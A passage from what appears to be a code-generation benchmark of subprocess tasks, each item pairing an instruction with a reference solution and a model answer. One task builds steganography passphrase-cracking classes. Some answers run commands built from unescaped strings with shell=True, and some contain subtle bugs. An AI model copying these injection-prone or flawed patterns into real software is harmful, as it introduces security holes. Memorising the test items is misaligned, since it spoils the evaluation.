    "Canonical_solution": "import os\nimport re\nimport subprocess\nimport logging\n\nclass PhonetisaurusG2P:\n    PATTERN = re.compile(r'^(?P<word>.+)\\t(?P<precision>\\d+\\.\\d+)\\t<s> ' +\n                         r'(?P<pronounciation>.*) </s>', re.MULTILINE)\n\n    def __init__(self, fst_model=None, nbest=None):\n        self._logger = logging.getLogger(__name__)\n        self.fst_model = os.path.abspath(fst_model)\n        self.nbest = nbest\n\n    def execute(self, input, is_file=False):\n        cmd = ['phonetisaurus-g2p',\n               '--model=%s' % self.fst_model,\n               '--input=%s' % input,\n               '--words']\n\n        if is_file:\n            cmd.append('--isfile')\n\n        if self.nbest is not None:\n            cmd.extend(['--nbest=%d' % self.nbest])\n\n        cmd = [str(x) for x in cmd]\n        try:\n            proc = subprocess.Popen(cmd, stdout=subprocess.PIPE,\n                                    stderr=subprocess.PIPE)\n            stdoutdata, stderrdata = proc.communicate()\n        except OSError:\n            self._logger.error(\"Error occured while executing command '%s'\",\n                             ' '.join(cmd), exc_info=True)\n            raise\n\n        if stderrdata:\n            for line in stderrdata.splitlines():\n                message = line.strip()\n                if message:\n                    self._logger.debug(message)\n\n        if proc.returncode != 0:\n            self._logger.error(\"Command '%s' return with exit status %d\",\n                             ' '.join(cmd), proc.returncode)\n            raise OSError(\"Command execution failed\")\n\n        result = {}\n        if stdoutdata is not None:\n            for word, precision, pronounc in self.PATTERN.findall(stdoutdata):\n                if word not in result:\n                    result[word] = []\n                result[word].append(pronounc)\n        return result",
    "Code_level": "Class-level",
    "FSMID_for_test": 76,
    "right_result": "import subprocess\nimport logging\nimport os\n\nclass PhonetisaurusG2P:\n    def __init__(self, fst_model=None, nbest=None):\n        self.fst_model = fst_model\n        self.nbest = nbest\n        self._logger = logging.getLogger(__name__)\n        if not os.path.isfile(self.fst_model):\n            raise FileNotFoundError(f\"FST model file not found: {self.fst_model}\")\n\n    def execute(self, input, is_file=False):\n        result = {}\n        cmd = [\"phonetisaurus-g2p\", \"--model={}\".format(self.fst_model)]\n        if self.nbest is not None:\n            cmd.append(\"--nbest={}\".format(self.nbest))\n        if is_file:\n            if not os.path.isfile(input):\n                raise FileNotFoundError(f\"Input file not found: {input}\")\n            cmd.append(\"--test={}\".format(input))\n            process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)\n        else:\n            process = subprocess.Popen(cmd, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)\n            process.stdin.write(input + \"\\n\")\n            process.stdin.close()\n\n        stdout, stderr = process.communicate()\n        if stderr:\n            self._logger.error(stderr)\n        if process.returncode != 0:\n            raise RuntimeError(f\"Phonetisaurus G2P execution failed with return code {process.returncode}: {stderr}\")\n\n        for line in stdout.strip().split(\"\\n\"):\n            parts = line.split(\"\\t\")\n            word = parts[0]\n            pronunciations = parts[1:]\n            result[word] = pronunciations\n\n        return result"
  },
  {
    "Task_id": 291,
    "Instruction": "Task Description: Implement a function that evaluates coreference resolution results using the official CoNLL-2012 evaluation script, parsing and returning the recall, precision, and F1 scores.\n\nFunction Description: The function `official_conll_eval` executes the official CoNLL-2012 evaluation script as a subprocess, captures its output, and parses the recall, precision, and F1 scores from the output. It can optionally log the official output for debugging or reporting purposes.\n\nInput:\n- `gold_path` (str): Path to the file containing gold-standard coreference annotations.\n- `predicted_path` (str): Path to the file containing predicted coreference annotations.\n- `metric` (str): The evaluation metric to compute (e.g., \"muc\", \"bcub\", \"ceafe\").\n- `official_stdout` (bool, optional): If True, logs the official evaluation script output. Defaults to True.\n\nOutput:\n- Returns a dictionary with the following keys:\n  - \"r\" (float): Recall score in percentage.\n  - \"p\" (float): Precision score in percentage.\n  - \"f\" (float): F1 score in percentage.",
    "Canonical_solution": "import re\nimport subprocess\nimport logging\n\nlogger = logging.getLogger(__name__)\nCOREF_RESULTS_REGEX = re.compile(r\".*Coreference: Recall: \\([0-9.]+ / [0-9.]+\\) ([0-9.]+)%\\tPrecision: \\([0-9.]+ / [0-9.]+\\) ([0-9.]+)%\\tF1: ([0-9.]+)%.*\", re.DOTALL)\n\ndef official_conll_eval(gold_path, predicted_path, metric, official_stdout=True):\n    cmd = [\"conll-2012/scorer/v8.01/scorer.pl\", metric, gold_path, predicted_path, \"none\"]\n    process = subprocess.Popen(cmd, stdout=subprocess.PIPE)\n    stdout, stderr = process.communicate()\n    process.wait()\n\n    stdout = stdout.decode(\"utf-8\")\n    if stderr is not None:\n        logger.error(stderr)\n\n    if official_stdout:\n        logger.info(\"Official result for {}\".format(metric))\n        logger.info(stdout)\n\n    coref_results_match = re.match(COREF_RESULTS_REGEX, stdout)\n    recall = float(coref_results_match.group(1))\n    precision = float(coref_results_match.group(2))\n    f1 = float(coref_results_match.group(3))\n    return {\"r\": recall, \"p\": precision, \"f\": f1}",
    "Code_level": "Function-level",
    "FSMID_for_test": 76,
    "right_result": "import subprocess\nimport re\n\ndef official_conll_eval(gold_path, predicted_path, metric, official_stdout=True):\n    command = f\"perl scorer.pl {metric} {gold_path} {predicted_path}\"\n    process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)\n    stdout, stderr = process.communicate()\n    output = stdout.decode('utf-8') if stdout else ''\n    if official_stdout and output:\n        print(output)\n    recall_match = re.search(r'Recall:\\s+(\\d+\\.\\d+)', output)\n    precision_match = re.search(r'Precision:\\s+(\\d+\\.\\d+)', output)\n    f1_match = re.search(r'F1:\\s+(\\d+\\.\\d+)', output)\n    r = float(recall_match.group(1)) if recall_match else 0.0\n    p = float(precision_match.group(1)) if precision_match else 0.0\n    f = float(f1_match.group(1)) if f1_match else 0.0\n    return {\"r\": r, \"p\": p, \"f\": f}"
  },
  {
    "Task_id": 292,
    "Instruction": "Task Description: Create a Python class that facilitates executing system commands with options for streaming output, sudo execution, and handling both string and list-based commands.\n\nClass Description: The ProcessRunner class provides a flexible way to execute system commands with various configurations. It handles command execution with options for streaming output in real-time, sudo privileges, and supports both string and list-formatted commands. The class manages subprocess creation, output capture, error handling, and return code collection.\n\nAttributes:\n- None (This class doesn't maintain persistent attributes between method calls)\n\nMethods:\n- _read_output(pipe, q) -> None - Private method that continuously reads from a pipe and puts data into a queue for output streaming.\n- _stream_output(comm, shell) -> tuple - Executes a command with streaming output capability, returns (stdout, stderr, returncode).\n- _decode(value) -> str - Helper method to decode byte strings to unicode (Python 3 compatibility).\n- _run_command(comm, shell) -> tuple - Executes a command and returns output after completion, returns (stdout, stderr, returncode).\n- execute(command_list, leave_on_fail) -> tuple/list - Main interface for command execution, handles multiple commands with various options. Returns single result tuple or list of tuples depending on input.\n\nInput Parameters:\n- For execute():\n  - command_list: dict/list - Either a single command dictionary or list of command dictionaries\n  - leave_on_fail: bool - Whether to stop execution if a command fails (default: False)\n- Command dictionary structure:\n  - args: list/str - The command to execute (either as list or string)\n  - shell: bool - Whether to use shell execution (default: False)\n  - stream: bool - Whether to stream output in real-time (default: False)\n  - sudo: bool - Whether to execute with sudo (default: False)\n\nOutput:\n- For single command: tuple (stdout_output, stderr_output, return_code)\n- For multiple commands: list of tuples [(stdout, stderr, returncode), ...]\n- On error: tuple (\"\", \"Command not found!\", 1)",
    "Canonical_solution": "import sys\nimport subprocess\nimport threading\nimport shlex\ntry:\n    from Queue import Queue, Empty\nexcept:\n    from queue import Queue, Empty\n\nON_POSIX = 'posix' in sys.builtin_module_names\n\nclass ProcessRunner:\n    def __init__(self):\n        pass\n\n    def _read_output(self, pipe, q):\n        try:\n            for line in iter(lambda: pipe.read(1), b''):\n                q.put(line)\n        except ValueError:\n            pass\n        pipe.close()\n\n    def _stream_output(self, comm, shell=False):\n        output = error = \"\"\n        p = ot = et = None\n        try:\n            if shell and type(comm) is list:\n                comm = \" \".join(shlex.quote(x) for x in comm)\n            if not shell and type(comm) is str:\n                comm = shlex.split(comm)\n            p = subprocess.Popen(comm, shell=shell, stdout=subprocess.PIPE, stderr=subprocess.PIPE, \n                                bufsize=0, universal_newlines=True, close_fds=ON_POSIX)\n            \n            q = Queue()\n            t = threading.Thread(target=self._read_output, args=(p.stdout, q))\n            t.daemon = True\n            \n            qe = Queue()\n            te = threading.Thread(target=self._read_output, args=(p.stderr, qe))\n            te.daemon = True\n            \n            t.start()\n            te.start()\n\n            while True:\n                c = z = \"\"\n                try:\n                    c = q.get_nowait()\n                except Empty:\n                    pass\n                else:\n                    sys.stdout.write(c)\n                    output += c\n                    sys.stdout.flush()\n                try:\n                    z = qe.get_nowait()\n                except Empty:\n                    pass\n                else:\n                    sys.stderr.write(z)\n                    error += z\n                    sys.stderr.flush()\n                p.poll()\n                if c==z==\"\" and p.returncode != None:\n                    break\n\n            o, e = p.communicate()\n            return (output+o, error+e, p.returncode)\n        except:\n            if p:\n                return (output, error, p.returncode)\n            return (\"\", \"Command not found!\", 1)\n\n    def _decode(self, value):\n        if sys.version_info >= (3,0) and isinstance(value, bytes):\n            return value.decode(\"utf-8\",\"ignore\")\n        return value\n\n    def _run_command(self, comm, shell=False):\n        try:\n            if shell and type(comm) is list:\n                comm = \" \".join(shlex.quote(x) for x in comm)\n            if not shell and type(comm) is str:\n                comm = shlex.split(comm)\n            p = subprocess.Popen(comm, shell=shell, stdout=subprocess.PIPE, stderr=subprocess.PIPE)\n            c = p.communicate()\n            return (self._decode(c[0]), self._decode(c[1]), p.returncode)\n        except:\n            return (\"\", \"Command not found!\", 1)\n\n    def execute(self, command_list, leave_on_fail=False):\n        if type(command_list) is dict:\n            command_list = [command_list]\n        output_list = []\n        for comm in command_list:\n            args = comm.get(\"args\", [])\n            shell = comm.get(\"shell\", False)\n            stream = comm.get(\"stream\", False)\n            sudo = comm.get(\"sudo\", False)\n            \n            if not len(args):\n                continue\n                \n            if sudo:\n                out = self._run_command([\"which\", \"sudo\"])\n                if \"sudo\" in out[0]:\n                    if type(args) is list:\n                        args.insert(0, out[0].replace(\"\\n\", \"\"))\n                    elif type(args) is str:\n                        args = out[0].replace(\"\\n\", \"\") + \" \" + args\n\n            if stream:\n                out = self._stream_output(args, shell)\n            else:\n                out = self._run_command(args, shell)\n                \n            output_list.append(out)\n            if leave_on_fail and out[2] != 0:\n                break\n                \n        return output_list[0] if len(output_list) == 1 else output_list",
    "Code_level": "Class-level",
    "FSMID_for_test": 76,
    "right_result": "import subprocess\nimport shlex\nimport queue\nimport threading\nimport os\nimport sys\n\nclass ProcessRunner:\n    def _read_output(self, pipe, q):\n        try:\n            for line in iter(pipe.readline, b''):\n                q.put(line)\n            pipe.close()\n        except Exception as e:\n            pass\n\n    def _decode(self, value):\n        if isinstance(value, bytes):\n            return value.decode('utf-8', errors='replace')\n        return value\n\n    def _stream_output(self, comm, shell):\n        stdout_queue = queue.Queue()\n        stderr_queue = queue.Queue()\n\n        process = subprocess.Popen(\n            comm,\n            stdout=subprocess.PIPE,\n            stderr=subprocess.PIPE,\n            shell=shell,\n            bufsize=0,\n            universal_newlines=True\n        )\n\n        stdout_thread = threading.Thread(target=self._read_output, args=(process.stdout, stdout_queue))\n        stderr_thread = threading.Thread(target=self._read_output, args=(process.stderr, stderr_queue))\n\n        stdout_thread.daemon = True\n        stderr_thread.daemon = True\n        stdout_thread.start()\n        stderr_thread.start()\n\n        stdout_lines = []\n        stderr_lines = []\n\n        while process.poll() is None or not stdout_queue.empty() or not stderr_queue.empty():\n            while not stdout_queue.empty():\n                line = self._decode(stdout_queue.get_nowait())\n                if line:\n                    stdout_lines.append(line)\n                    print(line.rstrip())\n\n            while not stderr_queue.empty():\n                line = self._decode(stderr_queue.get_nowait())\n                if line:\n                    stderr_lines.append(line)\n                    print(line.rstrip(), file=sys.stderr)\n\n        process.stdout.close()\n        process.stderr.close()\n        return (''.join(stdout_lines), ''.join(stderr_lines), process.returncode)\n\n    def _run_command(self, comm, shell):\n        process = subprocess.Popen(\n            comm,\n            stdout=subprocess.PIPE,\n            stderr=subprocess.PIPE,\n            shell=shell,\n            universal_newlines=True\n        )\n        stdout, stderr = process.communicate()\n        return (self._decode(stdout), self._decode(stderr), process.returncode)\n\n    def execute(self, command_list, leave_on_fail=False):\n        results = []\n        single_command = False\n\n        if not isinstance(command_list, list):\n            command_list = [command_list]\n            single_command = True\n\n        for cmd in command_list:\n            if not isinstance(cmd, dict) or 'args' not in cmd:\n                results.append((\"\", \"Command not found!\", 1))\n                if leave_on_fail:\n                    break\n                continue\n\n            comm = cmd['args']\n            shell = cmd.get('shell', False)\n            stream = cmd.get('stream', False)\n            sudo = cmd.get('sudo', False)\n\n            if sudo and os.geteuid() != 0:\n                if isinstance(comm, str):\n                    comm = ['sudo'] + shlex.split(comm)\n                else:\n                    comm = ['sudo'] + comm\n            elif isinstance(comm, str):\n                comm = shlex.split(comm)\n\n            try:\n                if stream:\n                    stdout, stderr, retcode = self._stream_output(comm, shell)\n                else:\n                    stdout, stderr, retcode = self._run_command(comm, shell)\n            except Exception as e:\n                stdout, stderr, retcode = (\"\", str(e), 1)\n\n            result = (stdout, stderr, retcode)\n            results.append(result)\n\n            if leave_on_fail and retcode != 0:\n                break\n\n        return results[0] if single_command else results"
  },
  {
    "Task_id": 293,
    "Instruction": "Task Description: Implement a set of steganography cracking classes that utilize subprocess communication to interact with different steganography tools (steghide, outguess, outguess-0.13, and openstego) for extracting hidden data from files.\n\nClass Description: Each class implements a specific steganography tool cracker using subprocess communication to interact with the respective command-line tool. The classes follow a similar pattern of spawning a subprocess, communicating with it via pipes, and analyzing the output to determine if the correct passphrase was found.\n\nAttributes:\nNone (These are stateless classes that don't maintain instance attributes)\n\nMethods:\n\nMethod1: crack_function(stego_file: str, passphrase: str) -> None - Attempts to extract hidden data from the given stego_file using the provided passphrase. Prints success message and exits if found, otherwise continues silently.\n\nClasses:\n\n1. ThreadedSteghideCracker:\n   - Uses 'steghide' command-line tool\n   - Checks for embedded file information in output\n   - Prints extraction command on success\n\n2. ThreadedOutguessCracker:\n   - Uses 'outguess' command-line tool\n   - Creates temporary file for output\n   - Validates extracted data for ASCII content\n   - Prints secret message and cleanup command on success\n\n3. ThreadedOutguess013Cracker:\n   - Uses 'outguess-0.13' command-line tool\n   - Similar functionality to ThreadedOutguessCracker\n   - Handles older version of outguess\n\n4. ThreadedOpenstegoCracker:\n   - Uses 'openstego' command-line tool\n   - Checks stderr for extraction success\n   - Prints extracted file path on success\n\nAll methods:\n- Use subprocess.Popen with stdout/stderr pipes\n- Process communication via communicate()\n- Include proper error handling\n- Exit program on successful extraction\n- Include cleanup for temporary files where applicable",
    "Canonical_solution": "import subprocess\nimport re\nimport sys\nimport os\nimport md5\n\nclass ThreadedSteghideCracker:\n    def crack_function(self, stego_file, passphrase):\n        process = subprocess.Popen(['steghide',\n                                  'info',\n                                  stego_file,\n                                  '-p', passphrase],\n                                 stdout=subprocess.PIPE,\n                                 stderr=subprocess.PIPE)\n        (out, err) = process.communicate()\n        m = re.search(r\"embedded file \\\"(.*)\\\"\", out)\n        if m is not None:\n            print(\"\\nFound '{}'!\\n\\\nExtract with `steghide extract -sf {} -p \\\"{}\\\"`\"\n                  .format(m.group(1), stego_file, passphrase))\n            sys.exit(0)\n\nclass ThreadedOutguessCracker:\n    def crack_function(self, stego_file, passphrase):\n        tmp_file = \"/tmp/{}\".format(md5.new(passphrase).hexdigest())\n        process = subprocess.Popen(['outguess',\n                                  '-k', passphrase,\n                                  '-r', stego_file,\n                                  tmp_file],\n                                 stdout=subprocess.PIPE,\n                                 stderr=subprocess.PIPE)\n        (out, err) = process.communicate()\n        try:\n            with open(tmp_file, \"r\") as f:\n                data = f.read()\n                if len(data) > 0:\n                    ascii_data = \"\".join(filter(lambda x: ord(x) < 128, data))\n                    if float(len(ascii_data)) / float(len(data)) > 0.8:\n                        print(\"\\nFound secret message:\\n---\\n{}\\n---\\n\\\nExtract with `outguess -k \\\"{}\\\" -r {} /tmp/outguess_secret.txt`\"\n                              .format(ascii_data, passphrase, stego_file))\n                        sys.exit(0)\n        finally:\n            os.remove(tmp_file)\n\nclass ThreadedOutguess013Cracker:\n    def crack_function(self, stego_file, passphrase):\n        tmp_file = \"/tmp/{}\".format(md5.new(passphrase).hexdigest())\n        process = subprocess.Popen(['outguess-0.13',\n                                  '-k', passphrase,\n                                  '-r', stego_file,\n                                  tmp_file],\n                                 stdout=subprocess.PIPE,\n                                 stderr=subprocess.PIPE)\n        (out, err) = process.communicate()\n        try:\n            with open(tmp_file, \"r\") as f:\n                data = f.read()\n                if len(data) > 0:\n                    ascii_data = \"\".join(filter(lambda x: ord(x) < 128, data))\n                    if float(len(ascii_data)) / float(len(data)) > 0.8:\n                        print(\"\\nFound secret message:\\n---\\n{}\\n---\\n\\\nExtract with `outguess -k \\\"{}\\\" -r {} /tmp/outguess_secret.txt`\"\n                              .format(ascii_data, passphrase, stego_file))\n                        sys.exit(0)\n        finally:\n            os.remove(tmp_file)\n\nclass ThreadedOpenstegoCracker:\n    def crack_function(self, stego_file, passphrase):\n        process = subprocess.Popen(['openstego', 'extract',\n                                  '-p', passphrase,\n                                  '-sf', stego_file],\n                                 stdout=subprocess.PIPE,\n                                 stderr=subprocess.PIPE)\n        (out, err) = process.communicate()\n        m = re.search(r\"Extracted file: (.*)\", err)\n        if m is not None:\n            print(\"\\nFound '{}'!\\n\\\nExtract with `openstego extract -sf {} -p \\\"{}\\\"`\"\n                  .format(m.group(1), stego_file, passphrase))\n            sys.exit(0)",
    "Code_level": "Class-level",
    "FSMID_for_test": 76,
    "right_result": "import subprocess\nimport os\nimport sys\nimport tempfile\nimport string\n\nclass ThreadedSteghideCracker:\n    @staticmethod\n    def crack_function(stego_file: str, passphrase: str) -> None:\n        try:\n            with subprocess.Popen(\n                ['steghide', 'extract', '-sf', stego_file, '-p', passphrase],\n                stdout=subprocess.PIPE,\n                stderr=subprocess.PIPE,\n                text=True\n            ) as process:\n                stdout, stderr = process.communicate()\n                \n                if \"embedded file\" in stdout.lower():\n                    print(f\"[+] Found correct passphrase for {stego_file} using Steghide!\")\n                    print(f\"Use this command to extract: steghide extract -sf {stego_file} -p '{passphrase}'\")\n                    sys.exit(0)\n        except Exception as e:\n            pass\n\nclass ThreadedOutguessCracker:\n    @staticmethod\n    def crack_function(stego_file: str, passphrase: str) -> None:\n        try:\n            with tempfile.NamedTemporaryFile(delete=False) as tmpfile:\n                temp_filename = tmpfile.name\n            \n            with subprocess.Popen(\n                ['outguess', '-k', passphrase, '-r', stego_file, temp_filename],\n                stdout=subprocess.PIPE,\n                stderr=subprocess.PIPE,\n                text=True\n            ) as process:\n                stdout, stderr = process.communicate()\n                \n                try:\n                    with open(temp_filename, 'r') as f:\n                        content = f.read(1024)\n                    \n                    if all(c in string.printable for c in content[:50]):\n                        print(f\"[+] Success with passphrase: {passphrase}\")\n                        print(f\"Secret message: {content[:500]}...\")\n                        print(f\"Cleanup with: rm {temp_filename}\")\n                        sys.exit(0)\n                finally:\n                    os.unlink(temp_filename)\n        except Exception as e:\n            pass\n\nclass ThreadedOutguess013Cracker:\n    @staticmethod\n    def crack_function(stego_file: str, passphrase: str) -> None:\n        try:\n            with tempfile.NamedTemporaryFile(delete=False) as tmpfile:\n                temp_filename = tmpfile.name\n            \n            with subprocess.Popen(\n                ['outguess-0.13', '-k', passphrase, '-r', stego_file, temp_filename],\n                stdout=subprocess.PIPE,\n                stderr=subprocess.PIPE,\n                text=True\n            ) as process:\n                stdout, stderr = process.communicate()\n                \n                try:\n                    with open(temp_filename, 'r') as f:\n                        content = f.read(1024)\n                    \n                    if all(c in string.printable for c in content[:50]):\n                        print(f\"[+] Success with passphrase: {passphrase}\")\n                        print(f\"Secret message: {content[:500]}...\")\n                        print(f\"Cleanup with: rm {temp_filename}\")\n                        sys.exit(0)\n                finally:\n                    os.unlink(temp_filename)\n        except Exception as e:\n            pass\n\nclass ThreadedOpenstegoCracker:\n    @staticmethod\n    def crack_function(stego_file: str, passphrase: str) -> None:\n        try:\n            output_dir = tempfile.mkdtemp()\n            output_path = os.path.join(output_dir, \"extracted.txt\")\n            \n            with subprocess.Popen(\n                ['openstego', 'extract', '-sf', stego_file, '-p', passphrase, '-out', output_path],\n                stdout=subprocess.PIPE,\n                stderr=subprocess.PIPE,\n                text=True\n            ) as process:\n                stdout, stderr = process.communicate()\n                \n                if \"Successfully extracted\" in stderr:\n                    print(f\"[+] OpenStego extraction successful! File saved to: {output_path}\")\n                    sys.exit(0)\n        except Exception as e:\n            pass"
  },
  {
    "Task_id": 294,
    "Instruction": "Task Description: Implement a set of functions to interact with the Mercurial (hg) version control system to retrieve branch information and repository status using subprocess communication.\n\nFunction Description: The functions use Python's subprocess module to execute Mercurial commands and capture their output through pipes. The functions handle process creation, communication, and output parsing to provide repository information.\n\nInput: None (functions retrieve information directly from the Mercurial repository in the current working directory)\n\nOutput:\n\n_get_hg_branch() -> str - Returns the current Mercurial branch name as a string\n_get_hg_status(output: tuple) -> list - Returns a list of status lines from Mercurial output\nbuild_stats() -> tuple - Returns a tuple containing (status_list, branch_name) or (None, None) if an error occurs",
    "Canonical_solution": "import subprocess\nfrom ..utils import get_subprocess_env\n\ndef _get_hg_branch():\n    p = subprocess.Popen([\"hg\", \"branch\"],\n                         stdout=subprocess.PIPE,\n                         stderr=subprocess.PIPE,\n                         env=get_subprocess_env())\n    branch = p.communicate()[0].decode(\"utf-8\").rstrip('\\n')\n    return branch\n\ndef _get_hg_status(output):\n    return output[0].decode(\"utf-8\").splitlines()\n\ndef build_stats():\n    try:\n        p = subprocess.Popen([\"hg\", \"status\"],\n                             stdout=subprocess.PIPE,\n                             stderr=subprocess.PIPE,\n                             env=get_subprocess_env())\n    except OSError:\n        return None, None\n    pdata = p.communicate()\n    if p.returncode != 0:\n        return None, None\n    status = _get_hg_status(pdata)\n    branch = _get_hg_branch()\n    return status, branch",
    "Code_level": "Function-level",
    "FSMID_for_test": 76,
    "right_result": "import subprocess\n\ndef _get_hg_branch():\n    try:\n        proc = subprocess.Popen(['hg', 'branch'], stdout=subprocess.PIPE, stderr=subprocess.PIPE)\n        output, _ = proc.communicate()\n        return output.decode('utf-8').strip() if proc.returncode == 0 else None\n    except Exception:\n        return None\n\ndef _get_hg_status(output):\n    try:\n        proc = subprocess.Popen(['hg', 'status'] + list(output), stdout=subprocess.PIPE, stderr=subprocess.PIPE)\n        output, _ = proc.communicate()\n        return output.decode('utf-8').strip().splitlines() if proc.returncode == 0 else []\n    except Exception:\n        return []\n\ndef build_stats():\n    branch = _get_hg_branch()\n    if branch is None:\n        return (None, None)\n    status = _get_hg_status(('--modified', '--added', '--removed', '--deleted'))\n    return (status, branch) if status is not None else (None, None)"
  },
  {
    "Task_id": 295,
    "Instruction": "Task Description: Create a function that reads audio data from bytes using FFmpeg and converts it into a numpy array with specified sampling rate.\n\nFunction Description: The function `ffmpeg_read` takes raw audio bytes and converts them into a mono audio waveform with a specified sampling rate using FFmpeg. The audio is converted to 32-bit floating-point format. The function handles FFmpeg process creation, data piping, and conversion to numpy array.\n\nInput:\n- `bpayload`: bytes - Raw audio data to be processed\n- `sampling_rate`: int - Target sampling rate for the output audio\n\nOutput:\n- np.array - A numpy array containing the audio waveform in 32-bit floating-point format\n\nNote: The function raises `ValueError` if FFmpeg is not found or if the output audio is malformed.",
    "Canonical_solution": "import subprocess\nimport numpy as np\n\ndef ffmpeg_read(bpayload: bytes, sampling_rate: int) -> np.array:\n    \"\"\"\n    Helper function to read an audio file through ffmpeg.\n    \"\"\"\n    ar = f\"{sampling_rate}\"\n    ac = \"1\"\n    format_for_conversion = \"f32le\"\n    ffmpeg_command = [\n        \"ffmpeg\",\n        \"-i\",\n        \"pipe:0\",\n        \"-ac\",\n        ac,\n        \"-ar\",\n        ar,\n        \"-f\",\n        format_for_conversion,\n        \"-hide_banner\",\n        \"-loglevel\",\n        \"quiet\",\n        \"pipe:1\",\n    ]\n\n    try:\n        ffmpeg_process = subprocess.Popen(ffmpeg_command, stdin=subprocess.PIPE, stdout=subprocess.PIPE)\n    except FileNotFoundError:\n        raise ValueError(\"ffmpeg was not found but is required to load audio files from filename\")\n    output_stream = ffmpeg_process.communicate(bpayload)\n    out_bytes = output_stream[0]\n\n    audio = np.frombuffer(out_bytes, np.float32)\n    if audio.shape[0] == 0:\n        raise ValueError(\"Malformed soundfile\")\n    return audio",
    "Code_level": "Function-level",
    "FSMID_for_test": 76,
    "right_result": "import numpy as np\nimport subprocess\nimport tempfile\nimport os\n\ndef ffmpeg_read(bpayload, sampling_rate):\n    with tempfile.NamedTemporaryFile(delete=False) as tmpfile:\n        tmpfile.write(bpayload)\n        tmpfile_path = tmpfile.name\n\n    try:\n        command = [\n            \"ffmpeg\",\n            \"-i\", tmpfile_path,\n            \"-f\", \"s32le\",\n            \"-ac\", \"1\",\n            \"-ar\", str(sampling_rate),\n            \"pipe:1\"\n        ]\n        process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE)\n        out_bytes, err = process.communicate()\n        if process.returncode != 0:\n            raise ValueError(f\"FFmpeg error: {err.decode()}\")\n        if not out_bytes:\n            raise ValueError(\"Empty output from FFmpeg\")\n        return np.frombuffer(out_bytes, dtype=np.float32)\n    finally:\n        os.unlink(tmpfile_path)"
  },
  {
    "Task_id": 296,
    "Instruction": "Task Description: Create a function that executes a system command using Python's subprocess module with pipe-based inter-process communication.\n\nFunction Description: The function should take a system command as input, execute it in a subprocess, capture the output through a pipe, and return the decoded output string. It should handle the process creation, communication, and cleanup automatically.\n\nInput: \n- com: [str] - The system command to be executed as a string\n\nOutput:\n- [str] - The decoded output from the executed command, as a string",
    "Canonical_solution": "import sys\nimport subprocess\n\ndef excuteCommand(com):\n    ex = subprocess.Popen(com, stdout=subprocess.PIPE, shell=True)\n    out, err = ex.communicate()\n    status = ex.wait()\n    return out.decode()",
    "Code_level": "Function-level",
    "FSMID_for_test": 76,
    "right_result": "import subprocess\n\ndef execute_command(com):\n    process = subprocess.Popen(com, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)\n    stdout, stderr = process.communicate()\n    return stdout.decode() if stdout else stderr.decode()"
  },
  {
    "Task_id": 298,
    "Instruction": "Task Description: Implement a class to collect and analyze OSSEC (Open Source Host-based Intrusion Detection System) agent states using subprocess communication.\n\nClass Description: The OssecCollector class interacts with the OSSEC agent control utility to retrieve agent status information and parse the results into a structured format. It handles command execution with optional sudo privileges and processes the output to count agent states.\n\nAttributes:\n- bin_path: [str] - Path to the OSSEC agent_control binary (default: '/var/ossec/bin/agent_control')\n- use_sudo: [bool] - Flag indicating whether to use sudo for command execution (default: True)\n- sudo_cmd: [str] - Path to the sudo binary (default: '/usr/bin/sudo')\n\nMethods:\n- __init__(bin_path: str = '/var/ossec/bin/agent_control', use_sudo: bool = True, sudo_cmd: str = '/usr/bin/sudo') -> None - Initializes the collector with configuration paths\n- collect() -> dict - Executes the agent control command, processes the output, and returns a dictionary counting agent states by status\n\nThe implementation should use subprocess.PIPE for inter-process communication and handle potential execution errors appropriately.",
    "Canonical_solution": "import subprocess\nimport re\nfrom diamond.collector import str_to_bool\n\nclass OssecCollector:\n    def __init__(self, bin_path='/var/ossec/bin/agent_control', use_sudo=True, sudo_cmd='/usr/bin/sudo'):\n        self.bin_path = bin_path\n        self.use_sudo = use_sudo\n        self.sudo_cmd = sudo_cmd\n\n    def collect(self):\n        command = [self.bin_path, '-l']\n\n        if str_to_bool(self.use_sudo):\n            command.insert(0, self.sudo_cmd)\n\n        try:\n            p = subprocess.Popen(command, stdout=subprocess.PIPE)\n            res = p.communicate()[0]\n        except Exception as e:\n            raise Exception('Unable to exec cmd: %s, because %s' % (' '.join(command), str(e)))\n\n        if res == '':\n            raise Exception('Empty result from exec cmd: %s' % (' '.join(command)))\n\n        states = {}\n        for line in res.split(\"\\n\"):\n            if not line.startswith('   ID: '):\n                continue\n            fragments = line.split(',')\n            state = fragments[-1].lstrip()\n            if state not in states:\n                states[state] = 1\n            else:\n                states[state] += 1\n\n        return states",
    "Code_level": "Class-level",
    "FSMID_for_test": 76,
    "right_result": "import subprocess\n\nclass OssecCollector:\n    def __init__(self, bin_path: str = '/var/ossec/bin/agent_control', use_sudo: bool = True, sudo_cmd: str = '/usr/bin/sudo') -> None:\n        self.bin_path = bin_path\n        self.use_sudo = use_sudo\n        self.sudo_cmd = sudo_cmd\n\n    def collect(self) -> dict:\n        command = []\n        if self.use_sudo:\n            command.append(self.sudo_cmd)\n        command.append(self.bin_path)\n        command.append('-l')\n\n        try:\n            process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)\n            stdout, stderr = process.communicate()\n\n            if process.returncode != 0:\n                raise RuntimeError(f\"Command failed with error: {stderr}\")\n\n            state_counts = {}\n            for line in stdout.splitlines():\n                if 'Status' in line:\n                    status = line.split(':')[1].strip()\n                    state_counts[status] = state_counts.get(status, 0) + 1\n            return state_counts\n\n        except Exception as e:\n            raise RuntimeError(f\"Execution error: {str(e)}\") from e"
  },
  {
    "Task_id": 299,
    "Instruction": "Task Description: Create a Python class that checks the installed version of npm (Node Package Manager) on the system using subprocess communication.\n\nClass Description: The Segment class is designed to retrieve and store the version of npm installed on the system. It uses subprocess.PIPE to communicate with the system process that runs the npm version command.\n\nAttributes:\nversion: [str] - Stores the version of npm retrieved from the system process. Initialized as None and updated after running the version check.\n\nMethods:\nrun: [run]() -> [None] - Executes the npm --version command using subprocess.Popen, captures the output, decodes it, and stores the result in the version attribute. Handles OSError exceptions if the command fails.\nget_version: [get_version]() -> [str] - Returns the stored npm version. Returns None if the version check was not successful or not run.",
